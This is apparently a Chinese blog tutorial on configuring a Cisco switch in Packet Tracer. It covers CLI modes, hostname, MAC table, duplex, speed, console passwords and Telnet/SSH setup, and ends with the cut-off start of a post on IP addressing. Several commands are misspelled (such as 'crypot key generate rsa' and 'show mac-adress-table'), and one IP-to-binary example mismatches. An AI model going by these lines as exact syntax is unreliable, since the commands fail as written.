思科设备上的命令模式：</h4><p><strong>用户模式：查看统计信息（一般情况下不用），用 “&gt;” 表示</strong></p><p><img src="\media\2023\01\交换机有关知识详解16.webp" alt=""></p><p>看到这样的就是用户模式。前面的Switch是交换机名字</p><p><strong>特权模式：用于查看并修改设备的配置（一般情况下是用来查看），用 “#” 表示</strong></p><p><strong>全局模式：针对设备的的整体配置参数，用 “(config)#” 表示</strong></p><p><strong>接口模式：针对设备的接口来修改配置参数，用 “(config-if)#” 表示</strong></p><h4 id="2-命令"><a href="#2-命令" class="headerlink" title="(2) 命令"></a>(2) 命令</h4><h5 id="用户模式切换到特权模式"><a href="#用户模式切换到特权模式" class="headerlink" title="用户模式切换到特权模式"></a>用户模式切换到特权模式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enable</span><br><span class="line"></span><br><span class="line">en  // 命令可以简写</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解17.webp" alt=""></p><h5 id="特权模式切换到全局模式"><a href="#特权模式切换到全局模式" class="headerlink" title="特权模式切换到全局模式"></a>特权模式切换到全局模式</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">configure terminal</span><br><span class="line"></span><br><span class="line">conf t  // 命令可以简写</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解18.webp" alt=""></p><h5 id="全局模式切换到接口模式"><a href="#全局模式切换到接口模式" class="headerlink" title="全局模式切换到接口模式"></a>全局模式切换到接口模式</h5><p>接口模式是进某一个接口</p><p>所以我们要先查看当前的接口</p><p>我们把鼠标放在交换机上面，放上面不要点击</p><p><img src="\media\2023\01\交换机有关知识详解19.webp" alt=""></p><p>这里能看见，0/1到0/24是FastEthernet（快速以太网）接口，</p><p>下面两个G开头的，是千兆以太网</p><p>Vlan1是虚拟局域网接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们现在想要进入到FastEthernet0/1这个接口</span><br><span class="line"></span><br><span class="line">interface fastethernet0/1  // 这样就进来了</span><br><span class="line"></span><br><span class="line">int f0/1  // 命令简写</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解20.webp" alt=""></p><h5 id="返回对应模式"><a href="#返回对应模式" class="headerlink" title="返回对应模式"></a>返回对应模式</h5><p>我们可以用 “exit” 返回上一级模式</p><p><img src="\media\2023\01\交换机有关知识详解21.webp" alt=""></p><p>如果想要直接返回到特权模式，可以使用 “end” 命令</p><p><img src="\media\2023\01\交换机有关知识详解22.webp" alt=""></p><h5 id="命令输错了"><a href="#命令输错了" class="headerlink" title="命令输错了"></a>命令输错了</h5><p>命令输错了会进入域名解析模式</p><p>我这里随便输个命令</p><p><img src="\media\2023\01\交换机有关知识详解23.webp" alt=""></p><p>他就会一直解析</p><p>这时候按 ctrl+shift+6可以退出来，不是F6是6</p><p><img src="\media\2023\01\交换机有关知识详解24.webp" alt=""></p><p>我们可以在<strong>全局模式</strong>中通过命令让它不进行域名解析模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">en  // 进入特权模式</span><br><span class="line">conf t  // 进入全局模式 </span><br><span class="line">no ip domain-lookup</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解25.webp" alt=""></p><p>可以看见，瞎输就不会进行解析了。</p><h5 id="配置主机名"><a href="#配置主机名" class="headerlink" title="配置主机名"></a>配置主机名</h5><p>给交换机配置一个主机名，要先进入全局模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">hostname SW1  // 将主机名配置为 SW1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解26.webp" alt=""></p><p>这样就把主机名改成了SW1</p><h5 id="查看MAC表"><a href="#查看MAC表" class="headerlink" title="查看MAC表"></a>查看MAC表</h5><p>我们知道交换机中维护了一张MAC表，那么怎么查看呢？</p><p>查看的话要么是在特权模式，要么是在用户模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">show mac-adress-table</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解27.webp" alt=""></p><p>由于现在没有设备和它连，也没有记录过，所以MAC表是空的</p><p>我们现在先简单连一下</p><p><img src="\media\2023\01\交换机有关知识详解28.webp" alt=""></p><p>可以看到现在交换机那里没有显示端口，我们可以设置一下</p><p>在选项 -&gt; 参数选择 -&gt; 在逻辑工作空间中总显示端口标签</p><p><img src="\media\2023\01\交换机有关知识详解29-1.webp" alt=""></p><p>现在看看是什么样的</p><p><img src="\media\2023\01\交换机有关知识详解30.webp" alt=""></p><p>现在就显示端口了。</p><p>想要MAC表中有数据，简单连上还不行，还得让设备通信过，想要通信得先有IP地址，我们先配置一下IP地址</p><p>点击一个设备 -&gt; 桌面 -&gt; IP配置，在这里配置IP地址</p><p><img src="\media\2023\01\交换机有关知识详解31.webp" alt=""></p><p><img src="\media\2023\01\交换机有关知识详解32.webp" alt=""></p><p>注意这两个设备的IP地址是同一个网段的，因为交换机所连接的是相同的网络</p><p>我们随便点击一个设备 -&gt; 桌面 -&gt; 命令提示符，在这里ping另一个设备的IP</p><p>比如我选择IP为192.168.1.1这个设备，我就在这个设备上ping另一个IP为192.168.1.2的设备</p><p><img src="\media\2023\01\交换机有关知识详解33.webp" alt=""></p><p>可以看到，可以ping通</p><p>我们这时候再去查看交换机的MAC表</p><p><img src="\media\2023\01\交换机有关知识详解34.webp" alt=""></p><p>可以看到现在MAC表中就有数据了</p><h5 id="交换机配置双工模式"><a href="#交换机配置双工模式" class="headerlink" title="交换机配置双工模式"></a>交换机配置双工模式</h5><p>我们可以通过命令配置双工模式</p><p>因为双工是针对接口的，所以要先进入接口模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int f0/1  // 我们这里配置 f0/1接口</span><br></pre></td></tr></table></figure><p>然后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">duplex ?  // ? 可以查看duplex用法</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解35.webp" alt=""></p><p>它有三个参数，<strong>auto（自适应），full（全双工），half（半双工）</strong>。</p><p>我们现在把他配置成半双工，就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">duplex half</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解36.webp" alt=""></p><p>我们可以看看模拟器中的交换机端口</p><p><img src="\media\2023\01\交换机有关知识详解37.webp" alt=""></p><p>可以看到我们配置的 f0/1 这个接口它变颜色了，绿色变成橙色了。</p><h5 id="查看接口模式"><a href="#查看接口模式" class="headerlink" title="查看接口模式"></a>查看接口模式</h5><p>查看要回到特权模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">end  // 回到特权模式</span><br><span class="line">show int f0/1 switchpor  // 查看交换机 f0/1 接口</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解38.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Name: Fa0/1  // 接口名称: Fa0/1</span><br><span class="line"></span><br><span class="line">Switchport: Enabled  // 接口: 可使用的</span><br><span class="line"></span><br><span class="line">Administrative Mode: dynamic auto  // 管理模式：动态自动</span><br><span class="line"></span><br><span class="line">Operational Mode: static access  // 操作模式：静态访问</span><br><span class="line"></span><br><span class="line">Administrative Trunking Encapsulation: dot1q  // 管理中继封装：dot1q</span><br><span class="line"></span><br><span class="line">Operational Trunking Encapsulation: native  // 操作中继封装：本机</span><br><span class="line"></span><br><span class="line">Negotiation of Trunking: On  // 中继协商：打开</span><br><span class="line"></span><br><span class="line">Access Mode VLAN: 1 (default)  // 访问模式VLAN：1（默认）</span><br><span class="line"></span><br><span class="line">Trunking Native Mode VLAN: 1 (default)  // 中继本机模式VLAN：1（默认）</span><br><span class="line"></span><br><span class="line">Voice VLAN: none  // 语音VLAN：无</span><br><span class="line"></span><br><span class="line">Administrative private-vlan host-association: none  // 管理专用vlan主机关联：无</span><br><span class="line"></span><br><span class="line">Administrative private-vlan mapping: none  // 管理专用vlan映射：无</span><br><span class="line"></span><br><span class="line">Administrative private-vlan trunk native VLAN: none  // 管理专用vlan主干本机vlan：无</span><br><span class="line"></span><br><span class="line">Administrative private-vlan trunk encapsulation: dot1q  // 管理专用vlan主干封装：dot1q</span><br><span class="line"></span><br><span class="line">Administrative private-vlan trunk normal VLANs: none  // 管理专用vlan干线普通vlan：无</span><br><span class="line"></span><br><span class="line">Administrative private-vlan trunk private VLANs: none  // 管理专用vlan中继专用vlan：无</span><br><span class="line"></span><br><span class="line">Operational private-vlan: none  // 操作专用vlan：无</span><br><span class="line"></span><br><span class="line">Trunking VLANs Enabled: All  // 已启用中继VLAN：全部</span><br><span class="line"></span><br><span class="line">Pruning VLANs Enabled: 2-1001  // 已启用修剪VLAN：2-1001</span><br><span class="line"></span><br><span class="line">Capture Mode Disabled  // 捕获模式已禁用</span><br><span class="line"></span><br><span class="line">Capture VLANs Allowed: ALL  // 允许捕获VLAN：所有</span><br><span class="line"></span><br><span class="line">Protected: false  // 受保护：false</span><br></pre></td></tr></table></figure><p>发现没有接口的工作模式，我们试试不加 switchport</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show int f0/1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解39.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">FastEthernet0/1 is up, line protocol is up (connected)  // FastEthernet0/1已启动，线路协议已启动（已连接）</span><br><span class="line"></span><br><span class="line">Hardware is Lance, address is 00e0.8f6a.1b01 (bia 00e0.8f6a.1b01)</span><br><span class="line">// 硬件是Lance，地址是00e0.8f6a.1b01（bia 00e0.8f6 a.1b001）</span><br><span class="line"></span><br><span class="line">BW 100000 Kbit, DLY 1000 usec,  // BW 100000 Kbit，DLY 1000 usec，</span><br><span class="line"></span><br><span class="line">reliability 255/255, txload 1/255, rxload 1/255  // 可靠性255/255，txload 1/255，rxload 1/255</span><br><span class="line"></span><br><span class="line">Encapsulation ARPA, loopback not set  // 封装ARPA，未设置环回</span><br><span class="line"></span><br><span class="line">Keepalive set (10 sec)  // 保活设置（10秒）</span><br><span class="line"></span><br><span class="line">Half-duplex, 100Mb/s  // 半双工，100Mb/s</span><br><span class="line"></span><br><span class="line">input flow-control is off, output flow-control is off  // 输入流量控制关闭，输出流量控制关闭</span><br><span class="line"></span><br><span class="line">ARP type: ARPA, ARP Timeout 04:00:00  // ARP类型：ARPA，ARP超时04:00:00</span><br><span class="line"></span><br><span class="line">Last input 00:00:08, output 00:00:05, output hang never  // 上次输入00:00:08，输出00:00:05，输出从不挂起</span><br><span class="line"></span><br><span class="line">Last clearing of &quot;show interface&quot; counters never  // “显示界面”计数器的上次清除从不</span><br><span class="line"></span><br><span class="line">Input queue: 0/75/0/0 (size/max/drops/flushes); Total output drops: 0  </span><br><span class="line">// 输入队列：0/75/0/0（size/max/drops/flush）；总输出下降：0</span><br><span class="line"></span><br><span class="line">Queueing strategy: fifo  // 排队策略：fifo</span><br><span class="line"></span><br><span class="line">Output queue :0/40 (size/max)  // 输出队列：0/40（大小/最大值）</span><br><span class="line"></span><br><span class="line">5 minute input rate 0 bits/sec, 0 packets/sec  // 5分钟输入速率0位/秒，0包/秒</span><br><span class="line"></span><br><span class="line">5 minute output rate 0 bits/sec, 0 packets/sec  // 5分钟输出速率0位/秒，0包/秒</span><br><span class="line"></span><br><span class="line">956 packets input, 193351 bytes, 0 no buffer  // 956个数据包输入，193351字节，0无缓冲区</span><br><span class="line"></span><br><span class="line">Received 956 broadcasts, 0 runts, 0 giants, 0 throttles  // 收到956次广播，0次跑步，0次巨人，0次节流</span><br><span class="line"></span><br><span class="line">0 input errors, 0 CRC, 0 frame, 0 overrun, 0 ignored, 0 abort  // 0输入错误，0 CRC，0帧，0超限，0忽略，0中止</span><br><span class="line"></span><br><span class="line">0 watchdog, 0 multicast, 0 pause input  // 0看门狗（我也不在知道是啥），0多播，0暂停输入</span><br><span class="line"></span><br><span class="line">0 input packets with dribble condition detected   // 检测到0个带运球条件的输入数据包</span><br><span class="line"></span><br><span class="line">2357 packets output, 263570 bytes, 0 underruns  // 2357个数据包输出，263570字节，0个欠载</span><br></pre></td></tr></table></figure><p>可以看到，这里面就显示了半双工</p><h5 id="设置交换机的接口速率"><a href="#设置交换机的接口速率" class="headerlink" title="设置交换机的接口速率"></a>设置交换机的接口速率</h5><p>我们刚才看到它的速率是 100mb/s，说明它是百兆带宽，我们现在把 0/2 这条链路的带宽改成 10Mb/s</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int f0/2</span><br><span class="line">speed 10  // 设置为10MB/S</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解40.webp" alt=""></p><p>所以现在是这样的</p><p><img src="\media\2023\01\交换机有关知识详解41.webp" alt=""></p><p>我们拿PC3去ping一下PC4试试</p><p><img src="\media\2023\01\交换机有关知识详解42-1.webp" alt=""></p><p>可以发现ping的时候就有延迟了。</p><h5 id="配置consol口的密码"><a href="#配置consol口的密码" class="headerlink" title="配置consol口的密码"></a>配置consol口的密码</h5><p>因为现在没配置密码，所有连上交换机的设备都可以配置交换机。</p><p>在现实环境中就需要配置交换机的consol口的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">line consol 0  // 进到这个consol接口中</span><br><span class="line">password 123456  // 配置密码为123456</span><br><span class="line">login  // 应用一下</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解43.webp" alt=""></p><p>这样就配置完了</p><p>我们看看密码配置完是什么样的，我们退到用户模式再重新进</p><p><img src="\media\2023\01\交换机有关知识详解44.webp" alt=""></p><p>发现要输入密码了</p><p><img src="\media\2023\01\交换机有关知识详解45.webp" alt=""></p><p>输入密码就可以了，密码密文显示</p><h2 id="三-远程管理交换机（TELENT，SSH）"><a href="#三-远程管理交换机（TELENT，SSH）" class="headerlink" title="三. 远程管理交换机（TELENT，SSH）"></a>三. 远程管理交换机（TELENT，SSH）</h2><h3 id="1-TELENT"><a href="#1-TELENT" class="headerlink" title="1. TELENT"></a>1. TELENT</h3><p>TELENT是应用层协议，默认端口号是23，采用的是明文密码方式，不安全，一般用于内网管理。</p><p>TELENT一般用于公司里管理公司里面的交换机。</p><h3 id="2-SSH"><a href="#2-SSH" class="headerlink" title="2. SSH"></a>2. SSH</h3><p>SSH也是应用层的协议，基于传输层TCP，默认端口号是22，采用密文密码方式，相对来讲比较安全，经常用于跨越互联网管理，也常用于远程管理Linux系统。</p><p>比如说云服务器就是需要用SSH</p><h3 id="3-思路"><a href="#3-思路" class="headerlink" title="3. 思路"></a>3. 思路</h3><p>既然是通过网络的方式进行管理设备，设备就必须配置IP地址，由于交换机上的接口都是交换接口，是不允许配置IP地址，直接为交换机的虚接口配置IP地址，默认情况下交换机的默认虚接口就是 vlan 1 接口。</p><p>配置设备的连接终端</p><p>设置对应的密码或者设置对应的用户名和密码</p><p>应用</p><h4 id="telent演示"><a href="#telent演示" class="headerlink" title="telent演示"></a>telent演示</h4><p>现在有一个设备和交换机</p><p><img src="\media\2023\01\交换机有关知识详解46.webp" alt=""></p><p>我们首先是给交换机vlan 1接口配置ip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int vlan 1  // 进入 vlan 1 接口</span><br><span class="line">ip address 192.168.100.100 255.255.255.0  // 配置IP为192.168.100.100，子网掩码为255.255.255.0</span><br><span class="line">no shutdown  // 打开这个接口</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解47.webp" alt=""></p><p>现在接口就开起来了。</p><p>我们现在配置设备的远程连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end</span><br><span class="line">conf t</span><br><span class="line">line vty 0 4  // 开启 0到4 5个终端，一共有16个，这里随便设置就行，问题不大。vty代表虚拟终端</span><br><span class="line">password 123456  // 直接在这里设置密码</span><br><span class="line">login  // 应用</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解48.webp" alt=""></p><p>然后就是创建连接用户名密码，配置设备终端并应用</p><p>先给设备配置IP</p><p>这里注意，因为我们配置的交换机IP是 192.168.100.100，所以设备IP要和他一个网段。我这里就配成了192.168.100.200</p><p><img src="\media\2023\01\交换机有关知识详解49.webp" alt=""></p><p>我们在这里就可以连了</p><p><img src="\media\2023\01\交换机有关知识详解50.webp" alt=""></p><p>我们先用TElENT，输入交换机IP</p><p><img src="\media\2023\01\交换机有关知识详解51.webp" alt=""></p><p>输入完成后点击connect</p><p>进入后输入密码就可以管理交换机了</p><p><img src="\media\2023\01\交换机有关知识详解52.webp" alt=""></p><p>我们试试</p><p><img src="\media\2023\01\交换机有关知识详解53.webp" alt=""></p><p>发现特权模式进不去，需要设置特权模式密码</p><p>我们在交换机的全局模式下设置一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable password 123456</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解54.webp" alt=""></p><p>这个是设置明文的密码，我们还可以设置密文的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable secret 456123</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解55-1.webp" alt=""></p><p>这样我们就设置了两个密码，我们可以查看当前的配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">end  // 退到特权模式</span><br><span class="line">show running-config</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解56.webp" alt=""></p><p>可以看到当前的交换机名称和明文密文密码，当然密文密码是密文显示的</p><p>这里注意，同时设置了明文和密文密码，仅有密文密码生效</p><p>我们回到设备试试，我先输入明文密码123456</p><p><img src="\media\2023\01\交换机有关知识详解57.webp" alt=""></p><p>可以看到没用</p><p>输入密文456123</p><p><img src="\media\2023\01\交换机有关知识详解58.webp" alt=""></p><p>进来了</p><p>这种方式是直接telent输入IP连接，然后输入密码就可以了，那我们要是想用用户名呢？</p><p>回到交换机，来到特权模式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">username trtyr password 123456  // 设置用户名trtyr，密码123456</span><br><span class="line">line vty 0 4</span><br><span class="line">login local  // login代表使用密码登录，local代表加上了用户名</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解59.webp" alt=""></p><p>我们再重连一下试试，还是选择telent</p><p><img src="\media\2023\01\交换机有关知识详解60.webp" alt=""></p><p><img src="\media\2023\01\交换机有关知识详解61.webp" alt=""></p><p>可以看到这里需要输入用户名了，而且自动变成了SSH</p><p><img src="\media\2023\01\交换机有关知识详解62.webp" alt=""></p><p>可以进到用户模式</p><p><img src="\media\2023\01\交换机有关知识详解63.webp" alt=""></p><p>进入特权模式还是要输入密码456123</p><h4 id="SSH演示"><a href="#SSH演示" class="headerlink" title="SSH演示"></a>SSH演示</h4><p>我们把之前的交换机删了重新搞一个，设备你想重新弄的话也行</p><p>还是先设置IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">en</span><br><span class="line">conf t</span><br><span class="line">int vlan 1 </span><br><span class="line">ip address 192.168.100.100 255.255.255.0 </span><br><span class="line">no shutdown</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解64.webp" alt=""></p><p>接口IP设置好后，我们查看这个交换机支不支持SSH连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">end</span><br><span class="line">show ip ssh</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解65.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">%Please create RSA keys (of atleast 768 bits size) to enable SSH v2.</span><br><span class="line">//  %请创建RSA密钥（至少768位大小）以启用SSH v2。</span><br><span class="line"></span><br><span class="line">Authentication timeout: 120 secs; Authentication retries: 3</span><br><span class="line">//  认证超时：120秒；身份验证重试次数：3</span><br></pre></td></tr></table></figure><p>告诉你创建密钥来启动SSH，说明它支持SSH</p><p>我们先改一个名字，因为SSH需要设置一个域名，这个域名不能用默认的名字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conf t</span><br><span class="line">hostname SW1</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解66.webp" alt=""></p><p>设置好名字后，我们设置一下它的域名，创建密钥对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip domain-name trtyr.com  // 设置域名 trtyr.com</span><br><span class="line">crypot key generate rsa  // 创建新的rsa密钥</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解67.webp" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">The name for the keys will be: SW1.trtyr.com</span><br><span class="line">// 密钥的名称为：SW1.trtyr.com</span><br><span class="line"></span><br><span class="line">Choose the size of the key modulus in the range of 360 to 2048 for your</span><br><span class="line">// 密钥长度是360到2048</span><br><span class="line"></span><br><span class="line">General Purpose Keys. Choosing a key modulus greater than 512 may take a few minutes.</span><br><span class="line">// 默认是512，如果要改长一点的话要几分钟时间</span><br><span class="line"></span><br><span class="line">How many bits in the modulus [512]:</span><br><span class="line">// 问改成多少</span><br></pre></td></tr></table></figure><p>我们直接改成最大的2048</p><p><img src="\media\2023\01\交换机有关知识详解68-2.webp" alt=""></p><p>这就OK了</p><p>我们还可以设置它的认证次数，其实默认的就行，这里就演示一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip ssh time-out 120   // 设置认证超时为120秒，默认的就是120秒</span><br><span class="line">ip ssh authentication-retyies 3  // 设置认证次数为3，默认的就是3次</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解69.webp" alt=""></p><p>然后就是和telent一样的了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username trtyr password 123456</span><br><span class="line">line vty 0 4</span><br><span class="line">login local</span><br><span class="line">exit</span><br><span class="line">enable secret 456123</span><br></pre></td></tr></table></figure><p><img src="\media\2023\01\交换机有关知识详解70.webp" alt=""></p><p>这样SSH就配置好了，然后我们去设备远程一下</p><p><img src="\media\2023\01\交换机有关知识详解71.webp" alt=""></p><p>进入</p><p><img src="\media\2023\01\交换机有关知识详解72.webp" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP地址方面知识详解</title>
      <link href="/2023/02/16/6/"/>
      <url>/2023/02/16/6/</url>
      
        <content type="html"><![CDATA[<h2 id="一-IP地址的基本概念"><a href="#一-IP地址的基本概念" class="headerlink" title="一. IP地址的基本概念"></a>一. IP地址的基本概念</h2><h3 id="1-IP地址"><a href="#1-IP地址" class="headerlink" title="1. IP地址"></a>1. IP地址</h3><p>用于表示网络中的某一台主机（某一个网络接口），主机的唯一标识，保证主机间的正常通信（主机想要及及进行网络通信，就必须配置相应的IP地址）</p><p>IP地址是一种网络编码，用来确定网络中的一个节点</p><p>IP地址由32为的二进制组成</p><p>我们举一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里有一个IP是 192.162.18.22，这是十进制表示的</span><br><span class="line"></span><br><span class="line">我们把它用二进制表示就是：11000000.10101000.00010010.00010110</span><br></pre></td></tr></table></figure><h3 id="2-IP地址的组成部分"><a href="#2-IP地址的组成部分" class="headerlink" title="2. IP地址的组成部分"></a>2. IP地址的组成部分</h3><p><strong>网络部分</strong>：用于标识网络部分</p><p><strong>主机部分</strong>：用于标识网络范围中的一个节点</p><p>举一个例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">我们假设，刚才那个IP地址：192.168.18.22</span><br><span class="line"></span><br><span class="line">（1）情况一</span><br><span class="line"></span><br><span class="line">如果 192.168.18 是网络部分，22是主机部分</span><br><span class="line"></span><br><span class="line">我们看主机部分：</span><br><span class="line"></span><br><span class="line">主机部分的范围是 00000000 ~ 111111111，换成十进制就是 0 ~ 255</span><br><span class="line"></span><br><span 